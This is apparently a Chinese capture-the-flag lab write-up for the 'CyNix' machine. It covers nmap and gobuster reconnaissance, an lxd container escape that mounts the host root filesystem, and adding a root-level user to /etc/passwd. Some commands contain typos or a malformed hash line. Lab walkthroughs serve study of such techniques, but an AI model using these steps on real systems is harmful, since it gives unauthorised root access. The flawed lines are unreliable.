---
title: CyNix
date: 2020-12-28 21:04:11
tags:手机 
---

## 0x01 信息收集

`nmap -p- -T5 192.168.43.155`扫描开放端口

`nmap -sV -p 80,6688 -A 192.168.43.155 -oA cynix`扫描指定端口

`gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt dir -u http://192.168.43.155 -t 100`扫描目录

要给密钥权限 `chmod 600 id_rsa`

## 0x02 权限提升

`lxd`提权利用。

`lxc image list`查看本地有无镜像文件

`lxc init ubuntu:16.06 Dem0 -c sercurity.privileged=true`挂载靶机 很慢很辣鸡

```
https://github.com/saghul/lxd-alpine-builder 下载这个玩意
```

![image-20201229202202521](https://i.loli.net/2020/12/29/iEx7LI3zSTYWt51.png)

常用文件请保存。

`lxc image import alpine-v3.12-x86_64-20201229_0719.tar.gz  --alias Dem0`导入镜像文件

`lxc init Dem0 Dem0 -c security.privileged=true`创建容器

`lxc config device add Dem0 Dem0 disk source=/ path=/mnt/root recursive=true`配置路径

`lxc start Dem0`启动

`lxc exec Dem0 /bin/sh`进入交互

利用`/etc/passwd`

```0
openssl passwd -1 salt Dem0 123456
```

```
dem0:1$dem0$LWnFTKnLwV4gGwR8yOaTr1:0:0:root:/root:/bin/bash
```

![image-20201229210116145](https://i.loli.net/2020/12/29/cLXge3jCUBaRDsn.png)